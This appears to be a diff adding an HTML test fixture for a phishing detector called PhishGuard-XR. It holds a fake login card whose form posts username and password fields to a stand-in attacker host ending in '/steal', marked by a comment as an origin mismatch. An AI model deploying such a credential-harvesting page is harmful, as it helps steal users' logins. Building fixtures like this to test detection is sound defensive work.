@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PhishGuard-XR Test Phishing Page</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background: #0f172a;
+      color: #f8fafc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: #1e293b;
+      padding: 32px;
+      border-radius: 12px;
+      width: 350px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+    }
+    h2 { margin-top: 0; color: #3b82f6; }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0 16px 0;
+      border-radius: 6px;
+      border: 1px solid #475569;
+      background: #0f172a;
+      color: white;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #ef4444;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Secure Login Verification</h2>
+    <!-- Origin Mismatch: Form action points to untrusted external origin -->
+    <form action="http://exfiltrate-stolen-data.attacker-c2.net/steal" method="POST">
+      <label>Username / Email</label>
+      <input type="text" placeholder="user@example.com">
+      
+      <label>Password</label>
+      <input type="password" placeholder="••••••••">
+      
+      <button type="submit">Log In</button>
+    </form>
+  </div>
+</body>
+</html>
